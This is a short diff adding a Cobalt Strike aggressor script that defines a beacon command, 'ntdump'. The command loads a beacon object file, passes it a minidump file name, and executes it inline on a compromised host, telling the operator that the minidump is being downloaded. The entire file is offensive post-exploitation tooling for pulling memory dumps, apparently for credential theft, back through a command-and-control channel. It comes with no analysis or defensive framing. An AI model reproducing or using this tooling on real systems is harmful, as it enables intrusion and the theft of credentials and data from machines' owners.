@@ -1,0 +1,31 @@
+#  $1 = Beacon ID
+#  $2 = file name of minidump file.
+
+alias ntdump {
+        local('$handle $data $args $filename');
+
+        if (size(@_) != 2)
+        {
+            berror($1, "NtDump: specify filename");
+            return;
+        }
+
+        # read in BOF file
+        $handle = openf(script_resource("NtDump.x64.o"));
+        $data = readb($handle, -1);
+
+        $filename = $2;
+
+        # pack the args
+        $args = bof_pack($1, "z", $filename);
+
+
+        #write to console what's going on
+        btask($1, "Downloading minidump file $2");
+
+        # Run the BOF
+        beacon_inline_execute($1, $data, "go", $args);
+
+
+
+}
